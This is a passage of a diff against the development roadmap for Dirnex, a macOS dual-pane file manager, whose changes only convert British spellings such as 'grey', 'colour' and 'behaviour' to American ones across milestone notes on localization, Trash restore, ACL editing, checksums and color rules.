   confirmation sheet on remove** (deleting a saved search discards a composed query that cannot be
-  recovered; this discards a pointer to a folder that has not moved — a sheet would be theatre).
+  recovered; this discards a pointer to a folder that has not moved — a sheet would be theater).
 - The main file was at 491 of its 500-line ceiling, so this pass had to *remove* as much as it
   added: `itemCell`'s favorites branch collapsed into a volume-only `volumeCell`, and the per-kind
   glyph table moved to the companion file. It sits at 494.
@@ -4916,7 +4962,7 @@ though the core half here is small: the sidebar's *keys* are pure app plumbing, 
   Application category arrays moved to a new `CommandCatalogCategories.swift` (the five widening from
   `private` to `internal`, since Swift's `private` doesn't cross files); `all` still composes them.
   The main file dropped to 213.
-- **`SidebarViewController+Keyboard.swift`** (new) is the whole interaction, modelled on
+- **`SidebarViewController+Keyboard.swift`** (new) is the whole interaction, modeled on
   `NSOutlineView` adapted to a flat table whose expand/collapse *is* the M8 fold state: **← ** steps
   an item out to its section header or collapses an open header, **→** expands a closed header or
   steps into an open one, **Return** activates an item (handing focus back to the pane, so browsing
@@ -4939,7 +4985,7 @@ present with the right glyphs — focused the sidebar onto **Home**, the left pa
 moved Home→Desktop→Documents; ← climbed to the Favorites header, ← again collapsed it *keeping the
 header selected across the rebuild*, → re-expanded it, → again stepped into Home; Return on Desktop
 navigated the pane there and **returned focus to the pane** (its `..` row went active-blue while the
-sidebar's selection dimmed to unfocused grey). Tab from the sidebar returned to the pane without
+sidebar's selection dimmed to unfocused gray). Tab from the sidebar returned to the pane without
 navigating; Tab from a pane still switched panes — no regression. Escape shares Tab's exit path and
 is not synthesizable under computer-use (docs/NOTES.md), so it rode the physical-key equivalent. The
 collapse flag toggled during the run was deleted afterward, leaving the store as found; no errors in
@@ -4947,7 +4993,7 @@ the log.
 
 Follow-up (2026-07-20, same day — the collapse-with-focus leak, VERIFIED LIVE): now that the sidebar
 can hold first responder, hiding it (⌃⌘S) *while it was focused* stranded keyboard focus on the bare
-window — both panes grey and Tab dead, since Tab is a pane key with no window-level fallback (see
+window — both panes gray and Tab dead, since Tab is a pane key with no window-level fallback (see
 docs/NOTES.md). `SidebarFocusSplitViewController` subclasses the outer split only to override
 `toggleSidebar(_:)` — the one funnel both the menu/palette and the titlebar button already call —
 capturing whether the sidebar held focus *before* `super` collapses it and handing focus to the
@@ -5119,11 +5165,11 @@ the results tab's clothes.
 
 - **A results tab's chip outlived its listing.** `customTitle` (and the query behind "Save Search…")
   was set when the tab opened and cleared only when a vanished directory reset the tab — so clicking
-  Home out of the Trash landed in the home folder with the tab still labelled "Trash". `navigate`
+  Home out of the Trash landed in the home folder with the tab still labeled "Trash". `navigate`
   now drops the whole results identity on arrival, captured *before* the load like `wasVirtual`
   beside it. Search and Recents tabs had the same bug; it is only glaring on the Trash, whose label
   is a place name rather than a query.
-- **The Trash gets its own two context menus** rather than the folder ones greyed down. What a
+- **The Trash gets its own two context menus** rather than the folder ones grayed down. What a
   trashed file offers is a different list, not a subset: no rename (the container advertises no
   `.rename`), no Pack or Paste, and a destructive tail that says `Delete Immediately…` — F8 in a
   trash already degrades to a confirmed permanent delete, so "Move to Trash" was naming the wrong
@@ -5138,7 +5184,7 @@ the results tab's clothes.
 
 Verified live on the real binary: Recents → Home and Trash → Home both relabel the chip to `oleg`;
 both Trash menus render as designed with every item live; Empty Trash… from the pane's background
-opens the counted confirmation; New Folder is greyed in the File menu inside the Trash.
+opens the counted confirmation; New Folder is grayed in the File menu inside the Trash.
 
 **Restore pass (2026-07-21):** Put Back, per item and for the whole Trash.
 
@@ -5171,7 +5217,7 @@ the volume root; a **decoy** at the original path produced "already back" with t
 the item still in the Trash; deleting the origin folder entirely and retrying **recreated** it and
 restored the file under its *original* name (proving `ptbN`); a folder came back with its contents;
 and both home-trash items — one trashed by the API, one by Finder, i.e. both recorded path forms —
-returned to the same real folder. Restore All's sheet counted the listing exactly; Put Back greys out
+returned to the same real folder. Restore All's sheet counted the listing exactly; Put Back grays out
 in an ordinary directory.
 
 ### M9 — iCloud Drive, for real (M)
@@ -5519,7 +5565,7 @@ file with its contents intact. Four decisions the checklist didn't pre-answer:
   `.unsupported` by default. Creating an empty file touches bytes, so §2 puts it in the core with
   tests; `O_EXCL` is what makes ⇧F4 safe on a name the user typed — the stat-then-create race
   would otherwise truncate a document on the way to opening it.
-- **"Inert on a folder" is a *greyed* menu item, not a swallowed keystroke.** The first cut left
+- **"Inert on a folder" is a *grayed* menu item, not a swallowed keystroke.** The first cut left
   F4 enabled with a folder under the cursor and doing nothing — caught in the built app, not by a
   test. Enabled now means exactly "the key does something": a local file, or nothing under the
   cursor at all (where F4 becomes ⇧F4's dialog).
@@ -5543,7 +5589,7 @@ file with its contents intact. Four decisions the checklist didn't pre-answer:
 wrong one for reading a contract or looking at a photograph. This gives it two larger sizes
 without giving it a second implementation: the existing overlay already *covers* the file
 list rather than hiding it, so the active pane's table keeps first responder and the cursor
-keeps driving the preview at any size. Every behaviour the panel has — cursor tracking, Tab
+keeps driving the preview at any size. Every behavior the panel has — cursor tracking, Tab
 to swap which pane is the source, on-demand archive-member extraction, the `PDFView` route
 for multi-page PDFs, Esc — transfers for free because none of it knows how big the preview is.
 
@@ -5556,7 +5602,7 @@ the native full-screen space, black backing, nothing on screen but the photo.
       (the `NSBox` backing, the lazy `QLPreviewView(.compact)`, the lazy `PDFView`, the
       content-type routing between them) come out of `PanelViewController+QuickView` into a
       standalone view. The pane keeps one pinned over its scroll view; each new mode hosts an
-      identical one at a different anchor. A pure refactor with no behaviour change, and the
+      identical one at a different anchor. A pure refactor with no behavior change, and the
       thing that keeps this slice from being three copies of one preview.
 - [x] **A mode, not a Bool** — `isQuickViewOn` becomes
       `QuickViewMode { off, pane, fullWindow, fullScreen }` on the window controller, which
@@ -5653,7 +5699,7 @@ counts as horizontal, how to compensate for acceleration, when the user has chan
 how to animate the remaining travel after the fingers lift. The handler now decides *which file* and
 nothing else, so the feel is the platform's and matches every other app on the machine. `SwipeStepper`
 and its 23 tests were **deleted**: not because the tests were wrong, but because the thing they
-pinned should never have been ours to decide. Dirnex honours
+pinned should never have been ours to decide. Dirnex honors
 `NSEvent.isSwipeTrackingFromScrollEventsEnabled` rather than substituting its own gesture — a user
 who has turned "Swipe between pages" off has said what they want, and ← / → still walk the list.
 
@@ -5692,7 +5738,7 @@ remaining literal, and the twelve further languages. **Fourteen languages ship**
 Deutsch · Español · Français · Italiano · 日本語 · 한국어 · Nederlands · Polski · Português (Brasil) ·
 Русский · Українська · 简体中文 · 繁體中文 — each with a complete `Localizable` column (802 keys,
 plural variants included) and both App Shortcut phrases, enforced by `LocalizationCoverageTests`. No
-RTL in the shipped set. Four of the fourteen are CJK, so the input-method behaviour of the inline
+RTL in the shipped set. Four of the fourteen are CJK, so the input-method behavior of the inline
 rename field and the palette is a live check none of the passes below records running.
 
 **Pass 1 — plumbing (2026-07-22, landed).** Auto-selection from the system language, an in-app
@@ -5915,7 +5961,7 @@ for it.
 - **Slice 9 landed (2026-07-23): the remaining Browser controllers.** The last bare status/tooltip
   strings across `Dirnex/Browser/` — the Find Files sheet (`SearchController`: field labels, the
   kind/size/date/scope popups, placeholders, Find/Cancel), the Save Search and Replace dialogs, the
-  New Tag dialog and its colour popup, the tag menu (New Tag… / Remove All Tags) and tag-change
+  New Tag dialog and its color popup, the tag menu (New Tag… / Remove All Tags) and tag-change
   failure, the Favorites ⌃D menu (No Pinned Folders / Add·Remove Current Folder / missing-favorite
   alert), the terminal-launch failure, the iCloud download sheet, the inline-rename validation and
   failure alerts, the search-results truncation alert, and the window-controller tooltips (Toggle
@@ -5924,11 +5970,11 @@ for it.
   `Recents`, `Trash`, `Results for %@`, and several more). **Three `DirnexCore` data enums got the
   registry treatment** (like `SidebarSection`): `SearchKind`/`SearchAge`/`FinderTagColor` `.title`
   reach the popups through a variable, so `LocalizationKey.searchKind/searchAge/tagColor` key them
-  (the last by a switch-derived stable token, not its `Int` raw value, so the catalog reads as colour
+  (the last by a switch-derived stable token, not its `Int` raw value, so the catalog reads as color
   names), `LocalizedCatalog.title(for:)` joins them, and `LocalizationCoverageTests` now fails on an
-  untranslated kind/age/colour (18 symbolic keys). Recurring traps fixed at the source: the
+  untranslated kind/age/color (18 symbolic keys). Recurring traps fixed at the source: the
   **`+`-concatenation trap** in the iCloud download body (`"a " + "b"` → one literal), and the New Tag
-  dialog's `colour` popup built its titles from `color.title` (a variable) — the exact reason the
+  dialog's `color` popup built its titles from `color.title` (a variable) — the exact reason the
   registry treatment exists. **Two things only the live Russian run caught, both after a *second*,
   wider scan:** the first pattern-based sweep missed every **multi-line `NSMenuItem(title:` / menu
   constructor** (the Favorites and tag menu items sat bare), and the **Recents virtual tab leaked
@@ -5939,10 +5985,10 @@ for it.
   the identity to draw "Недавние" with the sidebar's `clock` glyph — the same lesson as the Trash,
   that a *place you visit* must name itself rather than read as a search someone ran. The stock tag
   *names* in the ⌃T menu (Red/Orange/…) stay English on purpose — they are `FinderTag.systemTagName`
-  data, a separate core concern, not the colour titles. Keys taken from the compiler-emitted
+  data, a separate core concern, not the color titles. Keys taken from the compiler-emitted
   `.stringsdata`, added by script with an exact-match guard, verified additive-only (68 added, 0
   changed). Verified live in Russian: the whole Find Files sheet with all four popups, the Favorites
-  and tag menus, the New Tag dialog and its eight colour names (Без цвета · Серый · … · Оранжевый),
+  and tag menus, the New Tag dialog and its eight color names (Без цвета · Серый · … · Оранжевый),
   and the Recents self-naming; the awkward-to-provoke alerts were checked through the compiled
   `ru.lproj`.
 - **Slice 10 landed (2026-07-23): the undo/redo action labels — the last piece of Pass 2.** The
@@ -6023,9 +6069,9 @@ for it.
   - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
     additive-only check (50 added, 0 changed), and `Couldn’t mount the share (error %d).` was taken
     verbatim from it — the errno is an `Int32`, so the specifier is `%d`, not `%lld`.
-- **Slice 12 landed (2026-07-24): the completeness audit, and the first *behavioural* leak.** A
+- **Slice 12 landed (2026-07-24): the completeness audit, and the first *behavioral* leak.** A
   full re-run of Slice 11's sweep over the app and the core, cross-checked both ways against the
-  compiler-emitted `.stringsdata` (extracted-but-uncatalogued *and* catalogued-but-unused), plus a
+  compiler-emitted `.stringsdata` (extracted-but-uncataloged *and* cataloged-but-unused), plus a
   scan for bare literals at AppKit display sinks. The catalog itself came back clean — 726 keys, `en`
   and `ru` complete, no blanks — and the extracted-but-untranslated set was **exactly** the 21 App
   Intents keys already deferred, so Slices 1–11 held. Six leaks remained; **6 new catalog keys**
@@ -6047,7 +6093,7 @@ for it.
     tested precedence, and `LocalizedCatalog.summary(of:)`/`.plainName(of:)` pick the words. The
     display quotes became a `“%@”` format so Russian can answer `«%@»`.
   - **`NSAlert`'s Escape binding is English-only, which made this the first leak that changed
-    *behaviour* rather than pixels** — see NOTES.md for the probe and the two live bugs it turned up.
+    *behavior* rather than pixels** — see NOTES.md for the probe and the two live bugs it turned up.
     `enableEscapeToCancel(safe:)` now takes an `NSApplication.ModalResponse` instead of matching
     titles, and `EscapeToDismissTests` pins it with cases carrying no English word anywhere.
   - Keys added by script with the usual exact-match guard against the emitted `.stringsdata` and an
@@ -6091,7 +6137,7 @@ for it.
     said so in a comment — `pathSummary` is a stable English *identity*, the `title` is what's shown
     and localizes — and iCloud used the same constant for both. Invisible in Russian, where Apple
     keeps the product name; it would surface the first time a language transliterates it.
-  - The extracted-vs-catalogued diff over every `.stringsdata` now comes back **clean**, with one
+  - The extracted-vs-cataloged diff over every `.stringsdata` now comes back **clean**, with one
     deliberate survivor: `DisplayRepresentation(title: "\(name)")` in `DirnexOperationEntity` extracts
     `%@` because both arguments are already localized upstream. That is the shape the `noWindow` bug
     wore, so it is worth knowing which instances are legitimate.
@@ -6250,7 +6296,7 @@ what the wire actually does.
 - [x] `FTPBackend` over an injected `FTPTransport`: browse, byte transfer with resume, remote mkdir /
       rename / delete, all through the standard queue. Capabilities are `[.read, .write, .rename]` —
       no `.trash`, no `.clone`, no `.watch` — so `deleteStrategy` resolves to `.permanent` and the M5
-      degradation path (grey-out + Trash-less confirmed-permanent-delete) lights up with no new UI.
+      degradation path (gray-out + Trash-less confirmed-permanent-delete) lights up with no new UI.
       No `.watch` means no live refresh: refresh-on-focus and manual refresh, exactly as SFTP does.
 - [x] **Plain FTP, FTPS-explicit (`AUTH TLS` on port 21) and FTPS-implicit (port 990)**, plus
       **anonymous** login. Both extras are in scope rather than deferred because both are nearly free:
@@ -6692,7 +6738,7 @@ style (now natively produced on macOS too), with `.sfv` for CRC32.
 #### Slice 1 — checksum core (additive, app untouched)
 
 - `ChecksumAlgorithm` — `crc32 · md5 · sha1 · sha256`, carrying display name, digest width and
-  canonical file extension as data. SHA-256 is the default; the other three are labelled as
+  canonical file extension as data. SHA-256 is the default; the other three are labeled as
   interop formats and the UI must never imply MD5 or SHA-1 is a security property.
 - `CRC32` — table-driven, with the published vector as its first test (`"123456789"` →
   `0xCBF43926`, already confirmed in the probe). No zlib dependency for one function. If its
@@ -6789,7 +6835,7 @@ and `allowDataless` is the same escape hatch under the same name.
 shape, split into `ChecksumCreateRun` / `ChecksumVerifyRun` / `ChecksumRunContext` at the lint
 ceiling by concept, not by shaving. `FileOperation.Kind` grew its first case beyond `.copy`/`.move`
 (a `.checksum` kind carrying the report payload, with its `QueueSnapshot` status strings). App: the
-two commands in File as *Create Checksum File…* and *Verify Checksums…*, the report sheet modelled
+two commands in File as *Create Checksum File…* and *Verify Checksums…*, the report sheet modeled
 on the Sync diff table, and 40 extracted literals + the registry and `ChecksumError` keys across all
 13 languages, with `LocalizationErrorCoverageTests` added. 1319 core tests, both suites green, both
 linters clean.
@@ -6801,10 +6847,10 @@ linters clean.
 - **The report has four verdicts and each was forced live.** `verified` → green "Everything checks
   out"; `mismatch` → red ✗ "Doesn't match — expected <hex>…" (the *expected* digest, from the
   manifest); `missing` → amber ? "Not in this folder"; and an *unlisted* file present on disk but
-  absent from the manifest → grey + "Here, but not in the checksum file", with directories and the
+  absent from the manifest → gray + "Here, but not in the checksum file", with directories and the
   manifest file itself correctly excluded from that scan. The header flips red the moment any entry
   fails or goes missing; extras alone keep it green, since an unlisted file is an FYI, not a failure.
-- **Verify's menu item gates on a manifest being the cursor row**, greyed otherwise — validated
+- **Verify's menu item gates on a manifest being the cursor row**, grayed otherwise — validated
   live by watching it enable only once `sub.sha256` was selected.
 - **The dataless gate was retrofitted to the runner** (the Slice-1 follow-on's "worth doing in Slice
   2"), so a verify over a tree refuses the first placeholder and a pointed-at file asks — the
@@ -6831,10 +6877,10 @@ linters clean.
   entries are marked as such. The parse/serialize pair is the testable core; a captured real ACL
   from a real file is the fixture, per §"Working rhythm".
 - The **rights set is a function of item kind** (12 for a file, 17 for a directory), so it is
-  modelled as such rather than as one flat option set — the compiler then prevents offering
+  modeled as such rather than as one flat option set — the compiler then prevents offering
   `add_subdirectory` on a file.
 - `AttributePrivilege` — pure, from the probed matrix: given an entry's owner and the requested
-  diff, does this need root? It is what greys the panel and decides whether Slice 5 is reachable
+  diff, does this need root? It is what grays the panel and decides whether Slice 5 is reachable
   at all, and it is a table, so it is a test.
 
 **Slice 3 landed (2026-07-30), as designed, plus what a fresh probe changed.** Twelve core files —
@@ -6851,7 +6897,7 @@ change compiles.
   bits the kernel prints with their file names even on a directory (`list`≡`read`, `add_file`≡`write`,
   `search`≡`execute`, `add_subdirectory`≡`append`), so the parser only ever sees
   `read/write/execute/append` and the model is the **13 canonical bits**, not `chmod(1)`'s 17 input
-  tokens — the "17 for a directory" is 13 rights relabelled per kind + 4 inheritance flags. And the
+  tokens — the "17 for a directory" is 13 rights relabeled per kind + 4 inheritance flags. And the
   canonical form `acl_from_text` accepts needs **GUID + name + numeric id**, all three.
 - **Order is proven live in both directions, which is the exit criterion.** An ACL Dirnex writes
   reads back — through `acl_get_file` *and* `ls -le` — with deny-before-allow in the order written;
@@ -6945,7 +6991,7 @@ catalog keys across all 14 languages.
 - **The ACL exit criterion is met in the order that matters.** `ls -le`'s `0: group:staff deny
   delete` / `1: group:everyone allow read,readattr` renders as rows 1 and 2 in that order, deny in
   red. On the directory, `list,search,file_inherit,directory_inherit` renders as "List, Traverse —
-  files inherit, folders inherit", so the four aliased bits are relabelled per kind exactly as
+  files inherit, folders inherit", so the four aliased bits are relabeled per kind exactly as
   `ls -le` spells them.
 - **The mode-vs-ACL criterion is met too**: whenever an ACL is present the Permissions tab says so
   in orange and points at the Sharing tab, because an ACL does not change the mode and the nine
@@ -7020,7 +7066,7 @@ whatever the item is in now. All three dates are editable, through the plan that
   three fields differ the instant the sheet opens — Save enabled with nothing edited, and a `utimes`
   on commit for three dates nobody touched. `DateField.initial` holds what the control was *given*,
   which is what makes "untouched" mean untouched at the control's granularity. Verified live: the
-  sheet opens with Save greyed.
+  sheet opens with Save grayed.
 - The root-only alert now builds its sentence from the reason the core gave rather than assuming the
   system-flag case — four whole sentences, not one frame with a clause spliced in, because a clause's
   grammar depends on the sentence around it. That is the seam Slice 5 escalates from.
@@ -7041,7 +7087,7 @@ languages. 1449 core tests and 161 app tests green, both linters clean.
   `AttributesSnapshot` degrades a failed ACL read to an empty list, so the tab said "No access
   control list" — wrong in the quiet direction, on the one tab whose job is that answer. Both are
   accepted back by `acl_from_text`, so `ACLSubject.numericID` became optional and both now round-trip
-  losslessly, which is what keeps an edit to a *neighbouring* entry from rewriting them.
+  losslessly, which is what keeps an edit to a *neighboring* entry from rewriting them.
 - **`acl_set_file` is `EPERM` on a `UF_IMMUTABLE` file exactly as `chmod` is**, so the ACL is a step
   *inside* the existing unlock → apply → relock window rather than a second write beside it. The two
   halves are otherwise independent — `chmod`/`chgrp`/`utimes` each leave an ACL intact and in order,
@@ -7057,11 +7103,11 @@ languages. 1449 core tests and 161 app tests green, both linters clean.
 - **An entry with no rights is a real state that decides nothing**, and the probe is what showed it:
   `acl_from_text` accepts an empty rights field and `ls -le` shows `0: group:staff allow`. The editor
   displays such an entry ("Nothing — this entry has no effect") and refuses to write one — Save stays
-  greyed even though the list changed, verified live.
-- **Inherited entries are shown exactly as they apply and not edited in place** — greyed row, subject
+  grayed even though the list changed, verified live.
+- **Inherited entries are shown exactly as they apply and not edited in place** — grayed row, subject
   and rights disabled, a note explaining where they came from, and **remove** still available, since
   dropping an inherited entry from this item is the user's call. Writing a list back preserves the
-  `inherited` marker verbatim (probed), so editing a neighbour never silently forks one from its
+  `inherited` marker verbatim (probed), so editing a neighbor never silently forks one from its
   parent.
 - **The rights matrix was laid out from a measurement, not from the English.** Three columns need
   506 pt against 410 — English itself clipped "Execute" — and two columns in 410 overflow Russian at
@@ -7227,7 +7273,7 @@ deliberately — the flat single-item path is where the mechanism proves out.
   named, never dropped** (decided with Oleg). `chflags` is *additive* (probed), so each flags step is a
   minimal `keyword`/`nokeyword` delta against the word on disk at that point; `touch -t` is
   whole-second (which is the `NSDatePicker`'s own resolution) and only the *changed* time is touched, so
-  an untouched neighbour keeps its sub-second value; `chmod +a#` reproduces an *exact ordered* ACL, and
+  an untouched neighbor keeps its sub-second value; `chmod +a#` reproduces an *exact ordered* ACL, and
   the canonical `read/write/execute/append` spelling is accepted verbatim on a directory (chmod
   relabels it to `list/add_file/…` itself). The two omissions: the **Created date** (no stock tool sets
   the birth time without Xcode) and an **ACL `chmod` cannot express** (an inherited entry, an
@@ -7285,7 +7331,7 @@ unreachable — it would only fire in the rare state where the other pane's curs
 convention rather than a second selection rule.
 
 **A marked pair the tool can't take is refused, not quietly replaced.** Mark two folders and the
-command greys out; falling through would hand FileMerge two unrelated cursor files with nothing on
+command grays out; falling through would hand FileMerge two unrelated cursor files with nothing on
 screen saying the marks were ignored — wrong in the quiet direction, on a gesture whose whole point
 is "these two". Order inside a pane is **display order**, the in-pane reading of the
 physical-left-pane rule the cross-pane path has followed since the 2026-07-20 UX pass: the upper row
@@ -7303,10 +7349,10 @@ one can only mean the marks were declined. Verified live on the real binary with
 cursor deliberately on a folder — so nothing but the marks could have produced an answer: differing
 pair → FileMerge opened "one.txt vs. two.txt" with the upper row in the left column; identical pair
 → "Files are identical — nothing to compare." on the status line and no FileMerge in the process
-table; file + folder → the menu item grey. 1537 core + app tests green, swiftformat + swiftlint
+table; file + folder → the menu item gray. 1537 core + app tests green, swiftformat + swiftlint
 --strict clean. The failure detail now names both gestures, translated into all 14 languages.
 
-### M15 — The tree view, and colour the user chooses (M)
+### M15 — The tree view, and color the user chooses (M)
 
 Goal: the file list gets a second *shape* and a palette the user owns. Everything through M14 decided
 what a pane shows; this decided how it looks and how deep it reaches. Opened and closed 2026-08-02.
@@ -7353,18 +7399,18 @@ system font is exactly 16.00 pt (bold included — a marked row draws bold). So 
 
 #### Slice 2 — A palette the user owns (S–M) — landed 2026-08-02
 
-Three colours, each defaulting to **Follow System**, so an untouched install renders exactly as it
+Three colors, each defaulting to **Follow System**, so an untouched install renders exactly as it
 did before the slice and the default path stays AppKit's own drawing:
 
 - [x] **Accent** — overrides `.controlAccentColor` at the path bar, the tab chips and the update
       indicator. Framed in Settings as an override, because macOS already ships this control
       (System Settings ▸ Appearance ▸ Accent) and `.controlAccentColor` already follows it.
 - [x] **Cursor** — the row background. The sharp one: AppKit draws the emphasized selection, so a
-      custom colour needs an `NSTableRowView` subclass that draws its own. **Probed, and the answer
+      custom color needs an `NSTableRowView` subclass that draws its own. **Probed, and the answer
       simplified the plan:** when the delegate declines to supply a row view, `NSTableView` makes a
       plain `NSTableRowView` — in every one of its five styles — so a subclass that hands the call
       to `super` is byte-for-byte the shipped drawing, and `PanelRowView` is installed
-      *unconditionally* rather than only when a colour is set. Switching classes as the preference
+      *unconditionally* rather than only when a color is set. Switching classes as the preference
       changes would leave a reuse pool of the other kind to reason about; deferring leaves nothing
       to get wrong.
 - [x] **Mark** — the hardcoded `.systemRed` in `FileCellView`. Unlike the selection blue this one
@@ -7373,64 +7419,64 @@ did before the slice and the default path stays AppKit's own drawing:
 - [x] Two sites assumed the system blue and now take a **derived** foreground instead:
       `FileCellView.applyStyle`'s `.alternateSelectedControlTextColor`, and `SizeBarView`'s
       `isEmphasized` branch, whose own comment named it as the only fill that survives the blue.
-      Derived by luminance — never let the user pick the foreground, or the first custom colour
+      Derived by luminance — never let the user pick the foreground, or the first custom color
       makes the cursor row unreadable. **The rule is "white unless it drops below 3:1", not
       "whichever contrasts more"**, and the measurement is what settled it: `.controlAccentColor`
       is L=0.2114, where white scores 4.02:1 and black 5.23:1 — so maximum contrast picks *black*,
       while macOS and Dirnex's own tab chip draw white. See NOTES.md ▸ AppKit.
-- [x] Keep the emphasized/unemphasized split. NOTES.md ▸ AppKit: grey-versus-blue is AppKit saying
+- [x] Keep the emphasized/unemphasized split. NOTES.md ▸ AppKit: gray-versus-blue is AppKit saying
       the focus moved, and it is the signal the *rows themselves* carry (the path bar and tab chips
       say it separately, via `updateActiveAppearance`). Flatten the two and both panes' cursors look
       identical, which reads as permanently unfocused. Measured, the unemphasized selection is a
-      *pure grey* in both appearances (`#DCDCDC` / `#464646`, zero saturation) and in dark mode is
+      *pure gray* in both appearances (`#DCDCDC` / `#464646`, zero saturation) and in dark mode is
       **darker** than the emphasized fill rather than fainter — so there is nothing to derive, and
       only the emphasized half is drawn here.
 
-Deliberately not themable: Finder tag dots (they have to match Finder's own colours), git status
-colours, sync badges. Those are information, not decoration. All of it is presentation and lives
+Deliberately not themable: Finder tag dots (they have to match Finder's own colors), git status
+colors, sync badges. Those are information, not decoration. All of it is presentation and lives
 in the **app**, not the core (NOTES.md ▸ Localization: a presentation decision in the core is a
 string that can never be translated — the general form is that the core picks the state and the app
-picks the pixels), tested in `DirnexTests` the way `SyncBadgeTests` already is. Colours persist as
+picks the pixels), tested in `DirnexTests` the way `SyncBadgeTests` already is. Colors persist as
 hex in `UserDefaults`, per §2's "boring and debuggable".
 
-Exit: a non-default cursor colour renders legibly in both appearances, the inactive pane still reads
+Exit: a non-default cursor color renders legibly in both appearances, the inactive pane still reads
 as inactive, and Follow System restores byte-identical rendering. **Met** — verified live against
 the real binary with a deliberately pale cursor (`#FFD60A`): the name, size, date, the ncdu bar, its
 track and its percentage all flipped to black on it, a marked row under the cursor stayed bold and
-legible, the inactive pane kept AppKit's grey, and Settings ▸ Use System Colours restored the blue
+legible, the inactive pane kept AppKit's gray, and Settings ▸ Use System Colors restored the blue
 cursor, the blue crumb, the white-on-blue chip and the titlebar indicator live, without a relaunch.
 Legibility in the *other* appearance is a claim no single screenshot can make, so it is pinned by
-construction instead: the derivation is a luminance test over the user's own sRGB colour, measured
+construction instead: the derivation is a luminance test over the user's own sRGB color, measured
 identical under `.aqua` and `.darkAqua` and asserted in `PanelPaletteTests`.
 
 `PathBarView` hit SwiftLint's 500-line ceiling in this slice and was split by *concept* rather than
 shaved (CLAUDE.md ▸ file splitting): `PathBarView+Editing` takes the Cmd+L text field, its
 completion cache and the `NSTextFieldDelegate` conformance, leaving the crumb row behind.
 
-#### Slice 3 — Colour rules by file type (M) — landed 2026-08-02
+#### Slice 3 — Color rules by file type (M) — landed 2026-08-02
 
-Total Commander's signature: an ordered list of glob → colour rules, first match wins. Order is
+Total Commander's signature: an ordered list of glob → color rules, first match wins. Order is
 meaning, so the list is never silently canonicalized — the same rule an ACL's entry order follows.
 
 - [x] Core: `FileColorRule` + `FileColorRules.firstMatch(for:)`, pure and tested, over the same
-      `Glob` that `+`/`-` pattern select already uses. The colour rides as user *data* (hex), not as
-      a decision the core authored — the `FinderTag` split, where the core carries the colour and
+      `Glob` that `+`/`-` pattern select already uses. The color rides as user *data* (hex), not as
+      a decision the core authored — the `FinderTag` split, where the core carries the color and
       the app maps it to pixels. Two additions the plan didn't name, each because the shipped
       alternative is unwritable rather than merely inconvenient: a rule holds **several patterns**
-      (`*.jpg;*.png` is one "Images" rule with one colour), split on `;` and *not* on whitespace as
+      (`*.jpg;*.png` is one "Images" rule with one color), split on `;` and *not* on whitespace as
       TC does — a file name may contain a space, so space-splitting makes `My Photo*.jpg`
-      unexpressible; and a rule carries a **target** (files / folders / both), because "colour every
+      unexpressible; and a rule carries a **target** (files / folders / both), because "color every
       folder" is among the first things a TC user reaches for and a name glob cannot say it —
       `*` would take every file along with it.
 - [x] Precedence, made explicit rather than reusing the existing slot: `FileCellView.accentColor`
-      *outranked* the mark (a marked modified file still shows its orange git `M`), and a type colour
+      *outranked* the mark (a marked modified file still shows its orange git `M`), and a type color
       has to rank **below** it — a marked file must stay unmistakably marked. Resolution is now
-      git status → mark → type rule → label colour.
+      git status → mark → type rule → label color.
 - [x] Settings editor: add / remove / reorder with a live preview row, stored beside the user
       scripts. Reorder is explicit ▲/▼ buttons, not drag alone — it is the control that decides
       *which rule wins*, so it has to be reachable from the keyboard and be something you do rather
       than discover. The live preview is the row itself: the rule's name draws in the rule's own
-      colour, so an unreadable choice is visible where it is made rather than only out in the pane.
+      color, so an unreadable choice is visible where it is made rather than only out in the pane.
 
 **Measured before writing any of it, and it settled two decisions.** `fnmatch` costs **263 ns** a
 call, and that is the call itself — `String`→C bridging adds ~3 ns and `Glob`'s case-folding ~84 —
@@ -7440,19 +7486,19 @@ over a 60-row screen, worst case, an empty list is free, 5 rules × 2 patterns c
 reload and 20 × 3 cost 2.44 ms, against 0.10 / 0.53 ms for a memo — affordable next to a reload that
 already builds 240 views and looks up an icon per row. The second: a **malformed pattern matches
 nothing**, because `fnmatch` answers its error code (2) rather than `FNM_NOMATCH` for `[`, `[a-` and
-a lone `\`, and `Glob` tests for `== 0` — so a half-typed `[` in the live editor colours nothing
+a lone `\`, and `Glob` tests for `== 0` — so a half-typed `[` in the live editor colors nothing
 while the user keeps typing, instead of flooding the pane.
 
 Exit: `*.jpg` draws teal in both panes and survives relaunch; a marked `.jpg` still reads as marked;
 a modified `.jpg` inside a repository still shows its git letter. **Met** — verified live against the
-real binary, driving the real Settings editor: a `*.png` rule recoloured six files in both panes
+real binary, driving the real Settings editor: a `*.png` rule recolored six files in both panes
 while it was still being typed and came back after a quit/relaunch; the marked `.png` stayed bold red
-and the cursor row stayed white-on-blue, so both outrank the type colour; and in this repository
+and the cursor row stayed white-on-blue, so both outrank the type color; and in this repository
 `FileCellView.swift` kept its orange `M` and `FileColorRuleStore.swift` its green `?` while name,
-size and date drew in the rule's colour. Also verified, beyond the stated exit: a folders-only `*`
-coloured the folders while leaving files whose name it matches alone (the target gate, and the
+size and date drew in the rule's color. Also verified, beyond the stated exit: a folders-only `*`
+colored the folders while leaving files whose name it matches alone (the target gate, and the
 fall-through when it rejects), ▲/▼ moved a general rule above a specific one and the whole pane
-followed first-match-wins in both directions, the `..` row never takes a colour, and deleting the
+followed first-match-wins in both directions, the `..` row never takes a color, and deleting the
 rules restored the shipped rendering exactly.
 
 One bug found only by launching, in the class NOTES.md ▸ Localization already collects: **a SwiftUI
@@ -7513,7 +7559,7 @@ included.
       indentation + disclosure chevron, the `→`/`←` keys, per-tab persisted expansion, the one
       multi-path watcher, a `Tree View` command in the View menu (translated into all 14 languages),
       and the two fork points answered: the size bars are **withdrawn** in tree mode (a level's
-      siblings are not the row's neighbours), and every tree refresh keeps the
+      siblings are not the row's neighbors), and every tree refresh keeps the
       `installSortedModel` → `reloadEverything` → `syncCursorToTable(scroll: false)` tail.
 - [x] **Operation semantics landed 2026-08-02** — `TreeSelection` in the core (18 tests):
       `transferGroups(_:relativeTo:)` groups a marked set by each item's path relative to the pane's
@@ -7542,7 +7588,7 @@ cursor-restore through it and `displayedEntry(at:)`. Written up in NOTES.md ▸ 
 
 Both are operation semantics, not view work, which is why they could not be deferred into it:
 
-1. **What F5/F6 do with marks spanning levels.** *Settled: TC's branch-view behaviour* — flatten
+1. **What F5/F6 do with marks spanning levels.** *Settled: TC's branch-view behavior* — flatten
    *preserving relative paths* under the destination. Copying everything flat into one folder is the
